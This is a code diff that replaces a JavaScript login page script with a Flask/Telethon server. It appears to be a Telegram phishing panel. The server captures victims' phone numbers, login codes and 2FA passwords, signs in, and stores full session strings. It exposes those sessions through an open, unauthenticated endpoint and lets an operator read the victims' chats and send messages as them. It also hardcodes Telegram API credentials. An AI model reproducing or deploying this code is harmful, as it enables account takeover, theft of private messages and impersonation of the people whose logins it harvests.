@@ -1,243 +1,247 @@
-let sessionId = null;
-let phoneNumber = null;
+from flask import Flask, send_file, jsonify, request
+from flask_cors import CORS
+from telethon import TelegramClient, errors
+from telethon.sessions import StringSession
+import json
+import os
+import asyncio
+import threading
+from datetime import datetime
 
-function showMessage(text, type) {
-    const msgDiv = document.getElementById('message');
-    msgDiv.textContent = text;
-    msgDiv.className = type;
-}
+app = Flask(__name__)
+CORS(app)
 
-function showLoader(show) {
-    document.getElementById('loader').style.display = show ? 'block' : 'none';
-}
+# Your API credentials
+api_id = 33465589
+api_hash = '08bdab35790bf1fdf20c16a50bd323b8'
 
-function sendCode() {
-    const countryCode = document.getElementById('countryCode').value.trim();
-    const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+# Store temporary data for OTP
+temp_data = {}
+
+# Store accounts persistently
+accounts = []
+if os.path.exists('accounts.json'):
+    try:
+        with open('accounts.json', 'r') as f:
+            accounts = json.load(f)
+    except:
+        accounts = []
+
+def save_accounts():
+    with open('accounts.json', 'w') as f:
+        json.dump(accounts, f, indent=2)
+
+# Run async in a separate thread
+def run_async(coro):
+    """Run async function in a new thread with its own event loop"""
+    result = None
+    error = None
     
-    if (!countryCode || !phone) {
-        showMessage('Please enter country code and phone number', 'error');
-        return;
-    }
-
-    phoneNumber = '+' + countryCode + phone;
+    def run():
+        nonlocal result, error
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            result = loop.run_until_complete(coro)
+            loop.close()
+        except Exception as e:
+            error = e
     
-    document.getElementById('sendBtn').disabled = true;
-    showLoader(true);
-    showMessage('Sending code...', 'info-message');
+    thread = threading.Thread(target=run)
+    thread.start()
+    thread.join()
+    
+    if error:
+        raise error
+    return result
 
-    fetch('/api/add-account', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({phone: phoneNumber})
-    })
-    .then(res => res.json())
-    .then(data => {
-        showLoader(false);
-        document.getElementById('sendBtn').disabled = false;
+@app.route('/')
+def serve_login():
+    return send_file('login.html')
 
-        if (data.success) {
-            sessionId = data.session_id;
-            document.getElementById('phoneSection').style.display = 'none';
-            document.getElementById('codeSection').style.display = 'block';
-            document.getElementById('country').style.display = 'none';
-            document.querySelector('.first pre').textContent = 'We\'ve sent the code to';
-            document.getElementById('message').textContent = '';
-            
-            // Focus first input
-            document.querySelector('.code-input').focus();
-        } else {
-            showMessage(data.error || 'Failed to send code', 'error');
+@app.route('/dashboard')
+def serve_dashboard():
+    return send_file('dashboard.html')
+
+@app.route('/api/accounts', methods=['GET'])
+def get_accounts():
+    account_list = [{
+        'id': a['id'],
+        'phone': a['phone'],
+        'name': a['name'],
+        'username': a.get('username', ''),
+        'session': a.get('session', a.get('string_session', ''))
+    } for a in accounts]
+    return jsonify({'success': True, 'accounts': account_list})
+
+@app.route('/api/add-account', methods=['POST'])
+def add_account():
+    data = request.json
+    phone = data.get('phone')
+    
+    if not phone:
+        return jsonify({'success': False, 'error': 'Phone number required'})
+    
+    async def send_code():
+        client = TelegramClient(StringSession(), api_id, api_hash)
+        await client.connect()
+        result = await client.send_code_request(phone)
+        session_str = client.session.save()
+        await client.disconnect()
+        return result.phone_code_hash, session_str
+    
+    try:
+        phone_code_hash, session_str = run_async(send_code())
+        session_id = str(int(datetime.now().timestamp()))
+        temp_data[session_id] = {
+            'phone': phone,
+            'phone_code_hash': phone_code_hash,
+            'session_str': session_str
         }
-    })
-    .catch(err => {
-        showLoader(false);
-        document.getElementById('sendBtn').disabled = false;
-        showMessage('Network error: ' + err.message, 'error');
-    });
-}
+        return jsonify({'success': True, 'session_id': session_id})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
-function moveToNext(input, index) {
-    if (input.value.length === 1) {
-        input.classList.add('filled');
-        const next = document.querySelectorAll('.code-input')[index + 1];
-        if (next) next.focus();
-    }
-
-    // Auto submit when all filled
-    const inputs = document.querySelectorAll('.code-input');
-    const allFilled = Array.from(inputs).every(i => i.value.length === 1);
-    if (allFilled) {
-        setTimeout(() => verifyCode(), 100);
-    }
-}
-
-function handleBackspace(input, e) {
-    if (e.key === 'Backspace' && !input.value) {
-        const index = Array.from(document.querySelectorAll('.code-input')).indexOf(input);
-        const prev = document.querySelectorAll('.code-input')[index - 1];
-        if (prev) {
-            prev.focus();
-            prev.value = '';
-            prev.classList.remove('filled');
-        }
-    }
-}
-
-function verifyCode() {
-    const inputs = document.querySelectorAll('.code-input');
-    const code = Array.from(inputs).map(i => i.value).join('');
-
-    if (code.length !== 5) {
-        showMessage('Please enter 5-digit code', 'error');
-        return;
-    }
-
-    document.querySelector('.verify-btn').disabled = true;
-    showLoader(true);
-    showMessage('Verifying...', 'info-message');
-
-    fetch('/api/verify-code', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            session_id: sessionId,
-            code: code
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        showLoader(false);
-        document.querySelector('.verify-btn').disabled = false;
-
-        if (data.success) {
-            showMessage('✅ Account added successfully!', 'success');
-            setTimeout(() => {
-                window.location.href = '/home';
-            }, 1500);
-        } else if (data.need_password) {
-            document.getElementById('codeSection').style.display = 'none';
-            document.getElementById('passwordSection').style.display = 'block';
-            document.querySelector('.first pre').textContent = 'Enter your 2FA password';
-            document.getElementById('message').textContent = '';
-            document.getElementById('password').focus();
-        } else {
-            showMessage(data.error || 'Verification failed', 'error');
-            // Clear inputs
-            inputs.forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-            });
-            document.querySelector('.code-input').focus();
-        }
-    })
-    .catch(err => {
-        showLoader(false);
-        document.querySelector('.verify-btn').disabled = false;
-        showMessage('Network error: ' + err.message, 'error');
-    });
-}
-
-function verifyPassword() {
-    const password = document.getElementById('password').value;
-
-    if (!password) {
-        showMessage('Please enter password', 'error');
-        return;
-    }
-
-    document.querySelector('.password-btn').disabled = true;
-    showLoader(true);
-    showMessage('Verifying...', 'info-message');
-
-    fetch('/api/verify-code', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            session_id: sessionId,
-            password: password
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        showLoader(false);
-        document.querySelector('.password-btn').disabled = false;
-
-        if (data.success) {
-            showMessage('✅ Account added successfully!', 'success');
-            setTimeout(() => {
-                window.location.href = '/home';
-            }, 1500);
-        } else {
-            showMessage(data.error || 'Verification failed', 'error');
-            document.getElementById('password').value = '';
-            document.getElementById('password').focus();
-        }
-    })
-    .catch(err => {
-        showLoader(false);
-        document.querySelector('.password-btn').disabled = false;
-        showMessage('Network error: ' + err.message, 'error');
-    });
-}
-
-function backToPhone() {
-    document.getElementById('phoneSection').style.display = 'block';
-    document.getElementById('codeSection').style.display = 'none';
-    document.getElementById('passwordSection').style.display = 'none';
-    document.getElementById('country').style.display = 'block';
-    document.querySelector('.first pre').textContent = 'Please confirm your country code\nand enter your phone number';
-    document.getElementById('message').textContent = '';
+@app.route('/api/verify-code', methods=['POST'])
+def verify_code():
+    data = request.json
+    code = data.get('code')
+    session_id = data.get('session_id')
+    password = data.get('password', '')
     
-    // Clear inputs
-    document.querySelectorAll('.code-input').forEach(input => {
-        input.value = '';
-        input.classList.remove('filled');
-    });
-    document.getElementById('password').value = '';
+    if session_id not in temp_data:
+        return jsonify({'success': False, 'error': 'Session expired'})
     
-    sessionId = null;
-}
-
-// Country code auto-fill
-document.getElementById('countrySelect').addEventListener('change', function() {
-    document.getElementById('countryCode').value = this.value;
-});
-
-// Load saved country on page load
-window.addEventListener('load', function() {
-    document.getElementById('countryCode').focus();
+    session = temp_data[session_id]
+    phone = session['phone']
+    phone_code_hash = session['phone_code_hash']
+    session_str = session['session_str']
     
-    const savedCountry = localStorage.getItem('selectedCountry');
-    if (savedCountry) {
-        document.getElementById('countrySelect').value = savedCountry;
-        document.getElementById('countryCode').value = savedCountry;
-    }
-});
+    async def verify():
+        client = TelegramClient(StringSession(session_str), api_id, api_hash)
+        await client.connect()
+        try:
+            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+            me = await client.get_me()
+            string_session = client.session.save()
+            await client.disconnect()
+            return {'success': True, 'me': me, 'session': string_session}
+        except errors.SessionPasswordNeededError:
+            if password:
+                await client.sign_in(password=password)
+                me = await client.get_me()
+                string_session = client.session.save()
+                await client.disconnect()
+                return {'success': True, 'me': me, 'session': string_session}
+            else:
+                await client.disconnect()
+                return {'success': False, 'need_password': True}
+        except Exception as e:
+            await client.disconnect()
+            return {'success': False, 'error': str(e)}
+    
+    try:
+        result = run_async(verify())
+        if result.get('success'):
+            me = result['me']
+            string_session = result['session']
+            account = {
+                'id': len(accounts) + 1,
+                'phone': phone,
+                'name': me.first_name or 'User',
+                'username': me.username or '',
+                'session': string_session,
+                'date': str(datetime.now())
+            }
+            accounts.append(account)
+            save_accounts()
+            del temp_data[session_id]
+            return jsonify({'success': True, 'account': account})
+        elif result.get('need_password'):
+            return jsonify({'success': False, 'need_password': True})
+        else:
+            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
-// Save country selection
-document.getElementById('countrySelect').addEventListener('change', function() {
-    localStorage.setItem('selectedCountry', this.value);
-});
+@app.route('/api/get-messages', methods=['POST'])
+def get_messages():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    account = next((a for a in accounts if a['id'] == account_id), None)
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    session_string = account.get('session', account.get('string_session', ''))
+    
+    async def fetch():
+        client = TelegramClient(StringSession(session_string), api_id, api_hash)
+        await client.connect()
+        dialogs = await client.get_dialogs(limit=20)
+        chats = []
+        all_messages = []
+        for dialog in dialogs:
+            name = dialog.name or 'Unknown'
+            chat_id = str(dialog.id)
+            chats.append({
+                'id': chat_id,
+                'title': name,
+                'unread': dialog.unread_count or 0,
+                'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else '',
+                'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
+            })
+            try:
+                msgs = await client.get_messages(dialog.entity, limit=10)
+                for msg in msgs:
+                    if msg and msg.text:
+                        all_messages.append({
+                            'chatId': chat_id,
+                            'text': msg.text,
+                            'date': msg.date.timestamp(),
+                            'out': msg.out
+                        })
+            except:
+                pass
+        await client.disconnect()
+        return {'chats': chats, 'messages': all_messages}
+    
+    try:
+        result = run_async(fetch())
+        return jsonify({'success': True, 'chats': result['chats'], 'messages': result['messages']})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
-// Enter key handlers
-document.getElementById('countryCode').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') sendCode();
-});
+@app.route('/api/send-message', methods=['POST'])
+def send_message():
+    data = request.json
+    account_id = data.get('accountId')
+    chat_id = data.get('chatId')
+    message = data.get('message')
+    
+    account = next((a for a in accounts if a['id'] == account_id), None)
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    session_string = account.get('session', account.get('string_session', ''))
+    
+    async def send():
+        client = TelegramClient(StringSession(session_string), api_id, api_hash)
+        await client.connect()
+        try:
+            entity = await client.get_entity(int(chat_id))
+        except:
+            entity = await client.get_entity(chat_id)
+        await client.send_message(entity, message)
+        await client.disconnect()
+    
+    try:
+        run_async(send())
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
-document.getElementById('phone').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') sendCode();
-});
-
-document.getElementById('password').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') verifyPassword();
-});
-
-// Allow only numbers
-document.getElementById('countryCode').addEventListener('input', function(e) {
-    this.value = this.value.replace(/[^0-9]/g, '');
-});
-
-document.getElementById('phone').addEventListener('input', function(e) {
-    this.value = this.value.replace(/[^0-9]/g, '');
-});
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    print(f"Server starting on port {port}...")
+    app.run(host='0.0.0.0', port=port)
